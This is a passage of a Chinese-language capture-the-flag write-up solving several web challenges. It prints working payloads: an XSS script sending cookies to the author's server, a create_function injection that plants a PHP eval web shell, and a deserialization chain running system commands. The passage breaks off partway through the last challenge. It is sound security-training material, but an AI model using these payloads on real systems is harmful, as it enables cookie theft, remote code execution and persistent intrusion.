<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113906319.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113906319.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113906319.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113906319.png?size=large 2x" sizes="auto" data-title="image-20231016113906319" data-alt="image-20231016113906319" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="0x03-lavish-pastebin">0x03 Lavish Pastebin</h2>
<p>这题进去随便输入内容，发现html直接加载了原内容。于是怀疑是XSS。</p>
<p>这里输入<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>试一试，确实可以。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103404256.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103404256.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103404256.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103404256.png?size=large 2x" sizes="auto" data-title="image-20231016103404256" data-alt="image-20231016103404256" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>但是根据源码，发现加载了CSP策略。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103459992.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103459992.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103459992.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103459992.png?size=large 2x" sizes="auto" data-title="image-20231016103459992" data-alt="image-20231016103459992" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这里的<code>script-src</code>是<code>unsafe-inline</code>，即代表可以加载内联的Javascript。</p>
<p>于是想到了window.location。这里由于xss平台不支持直接接受http请求数据，我选择在自己的vps上用nc监听。（ip隐藏了，效果如下所示）</p>
<p>payload如下所示：</p>
<div class="highlight" id="id-30"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;script&gt;
</span></span><span class="line"><span class="cl">location.href=&#34;http://49.51.**.***:8080/?f=&#34;+encodeURIComponent(document.cookie);
</span></span><span class="line"><span class="cl">&lt;/script&gt;</span></span></code></pre></td></tr></table>
</div>
</div><p>这里发现一个问题，就是执行完这个payload发现下面提交给机器人的按钮没有了。于是选择抓提交机器人的包，然后将含有payload的pastebin直接发送给机器人：</p>
<div class="highlight" id="id-31"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /report HTTP/1.1
</span></span><span class="line"><span class="cl">Host: game.ctf.seusus.com:31471
</span></span><span class="line"><span class="cl">Content-Length: 35
</span></span><span class="line"><span class="cl">Cache-Control: max-age=0
</span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
</span></span><span class="line"><span class="cl">Origin: http://game.ctf.seusus.com:31471
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class="line"><span class="cl">Referer: http://game.ctf.seusus.com:31471/paste/850ab8e7f7f1bc71c5219903ef6099cf
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
</span></span><span class="line"><span class="cl">Connection: close
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">id=f17835c73eced2b97b2ebc4f75b4abb2</span></span></code></pre></td></tr></table>
</div>
</div><p>将上方id换成含有payload的pastebin给机器人即可。</p>
<p>此时在服务器端等待，即可收到flag：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231016105020.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231016105020.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231016105020.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231016105020.png?size=large 2x" sizes="auto" data-title="微信图片_20231016105020" data-alt="微信图片_20231016105020" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="0x04-why-not-play-a-game">0x04 why not play a game</h2>
<p>题目提示得到最高分的时候即可获得flag，这里猜测flag可能就存在在js文件中。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016105210317.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016105210317.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016105210317.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016105210317.png?size=large 2x" sizes="auto" data-title="image-20231016105210317" data-alt="image-20231016105210317" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>搜索susctf即可找到flag。</p>
<h2 id="0x05-easy_rce">0x05 easy_rce</h2>
<div class="highlight" id="id-32"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$key</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>看了下题目，实际上是可变变量的问题。在php中可变变量可以当作函数名来执行。</p>
<p>这里由于要求的参数第一位是&quot;&quot;，可供选择的函数很少。这里有一个函数是：create_function</p>
<p>这个函数存在一个漏洞，就是代码注入的问题：</p>
<p>create_function()会创建一个匿名函数（lambda样式），同时create_function()函数会在内部执行 eval()，我们发现是执行了后面的return语句，属于create_function()中的第二个参数string $code位置。该函数即等价于下面的情况。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/6.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/6.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/6.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/6.png?size=large 2x" sizes="auto" data-title="6" data-alt="6" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>于是可以直接使用如下payload进行闭合，从而实现任意命令执行：</p>
<div class="highlight" id="id-33"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">create_function</span><span class="o">=</span><span class="k">return</span><span class="o">%</span><span class="mi">20111</span><span class="p">;}</span><span class="o">...//</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里我是直接写入木马：</p>
<div class="highlight" id="id-34"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">create_function</span><span class="o">=</span><span class="k">return</span><span class="o">%</span><span class="mi">20111</span><span class="p">;}</span><span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php @eval($_POST[cmd]);?&gt;&#39;</span><span class="p">);</span><span class="c1">//
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这时直接用蚁剑连shell.php即可。</p>
<p>连接后在根目录发现flag。可是由于权限是700根本无法查看。</p>
<p>这里找了好久，终于在/tmp下找到了一个mycat程序，使用命令<code>mycat /flag</code>才可以读取flag中的文件。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110259303.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110259303.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110259303.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110259303.png?size=large 2x" sizes="auto" data-title="image-20231016110259303" data-alt="image-20231016110259303" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110228445.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110228445.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110228445.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110228445.png?size=large 2x" sizes="auto" data-title="image-20231016110228445" data-alt="image-20231016110228445" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="0x06-sleep-away">0x06 sleep away</h2>
<p>看见题目就知道是反序列化的题目。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110343705.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110343705.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110343705.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110343705.png?size=large 2x" sizes="auto" data-title="image-20231016110343705" data-alt="image-20231016110343705" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这里发现注入点在safeeval中的<code>__destrcut</code>函数中，他会在对象销毁的时候自动执行。但是，命令执行的参数args_down会在反序列化wakeup的时候被清空为空数组。</p>
<p>于是这里想到要绕wakeup。这里常用的方法是修改对象中参数的个数为不合法的个数。但是试了一下发现根本没用，因为此时destruct也不执行了。</p>
<p>此时发现helper中的wakeup具有修改内容的功能。而且我们知道，当类嵌套类的时候，内部类的wakeup会先触发。这里我的思路就是evalsafe在内部，让其wakeup先修改args_down,然后将helper的youneed绑定（引用）到safeeval类的args_down上，通过turearg（不是truearg）修改args_down参数即可。</p>
<p>于是payload如下所示：</p>
<div class="highlight" id="id-35"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">safeeval</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$evalstr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$args_down</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span> <span class="p">(</span><span class="nv">$e</span><span class="p">,</span><span class="nv">$arg</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">evalstr</span><span class="o">=</span><span class="nv">$e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args_down</span><span class="o">=</span><span class="nv">$arg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$evalstr</span><span class="o">=</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">evalstr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$evalstr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args_down</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;eval wakeup&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">args_down</span><span class="o">=</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">helper</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$youneed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$turearg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$thinkit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;helper wakeup&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">youneed</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">turearg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;step1&#39;</span><span class="p">]</span><span class="o">==</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;step1&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;zhi shi xue bao&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;xue bao bi zui&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">helper</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">safeeval</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;ls&#39;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">thinkit</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// var_dump($a-&gt;thinkit);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">youneed</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$b</span><span class="o">-&gt;</span><span class="na">args_down</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">// var_dump($a-&gt;youneed);
</span></span></span><span class="line"><span class="cl"><span class="c1">// $a-&gt;turearg = &#39;ls /&#39;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">turearg</span> <span class="o">=</span> <span class="s1">&#39;cat /f1agggg&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里将thinkit绑定<code>$b</code>只是为了方便测试，其实可以不绑定的，得到的结果就是：</p>
<div class="highlight" id="id-36"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">O</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;helper&#34;</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;youneed&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="s2">&#34;ls&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;turearg&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">12</span><span class="o">:</span><span class="s2">&#34;cat /f1agggg&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;thinkit&#34;</span><span class="p">;</span><span class="nx">O</span><span class="o">:</span><span class="mi">8</span><span class="o">:</span><span class="s2">&#34;safeeval&#34;</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="nx">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">&#34;evalstr&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">&#34;system&#34;</span><span class="p">;</span><span class="nx">s</span><span class="o">:</span><span class="mi">9</span><span class="o">:</span><span class="s2">&#34;args_down&#34;</span><span class="p">;</span><span class="nx">R</span><span class="o">:</span><span class="mi">2</span><span class="p">;}}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>哦对这里还有个md5的问题，由于php的弱类型比较特性，我们可以使用字符串开头为'0e&rsquo;的md5值来绕过判定。这里存在一个自身和md5的开头都是0e的字符串，他就是:</p>
<div class="highlight" id="id-37"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0e215962017</span></span></code></pre></td></tr></table>
</div>
</div><p>填入step1即可完成。找到的flag如下：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114619400.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114619400.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114619400.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114619400.png?size=large 2x" sizes="auto" data-title="image-20231016114619400" data-alt="image-20231016114619400" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="0x07-转瞬即逝">0x07 转瞬即逝</h2>
<p>由于网页没有给什么有用的信息，查看源码：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111404002.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111404002.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111404002.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111404002.png?size=large 2x" sizes="auto" data-title="image-20231016111404002" data-alt="image-20231016111404002" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>发现密码需要和当前的时间戳的值相差在5之内就行。</p>
<p>想到负数也小于5啊，那么我们的密码可以稍微比当前时间大一点。</p>
<p>先在js中使用<code>Date.parse(new Date())/1000;</code>获取当前时间戳，然后再后面加个1填入即可。</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111617039.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111617039.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111617039.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016111617039.png?size=large 2x" sizes="auto" data-title="image-20231016111617039" data-alt="image-20231016111617039" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>登录之后只看到一闪而过的login success，但是此时并没有发现什么异常。</p>
<p>这时查看请求头：</p>
